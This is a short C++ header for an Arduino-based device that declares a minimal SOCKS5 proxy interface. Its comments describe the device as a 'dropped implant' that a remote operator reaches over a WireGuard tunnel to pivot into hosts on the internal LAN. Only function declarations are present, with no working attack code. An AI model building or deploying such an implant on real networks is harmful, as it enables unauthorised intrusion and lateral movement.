#pragma once
#include <Arduino.h>

// Minimal SOCKS5 proxy (CONNECT only, no auth). Meant to be reached over the
// WireGuard pivot: the remote operator points their SOCKS client at the
// device's tunnel IP:port and reaches hosts on the local LAN through it, so
// the dropped implant becomes a pivot into the internal network.
//
// CONNECT only (no BIND/UDP-ASSOCIATE); IPv4 and domain-name targets; a small
// pool of concurrent connections (lwIP has a limited socket count).
namespace Socks5 {
    bool start(uint16_t port = 1080);
    void stop();
    bool isRunning();

    // JSON: {running, port, active, served}
    String status();
}
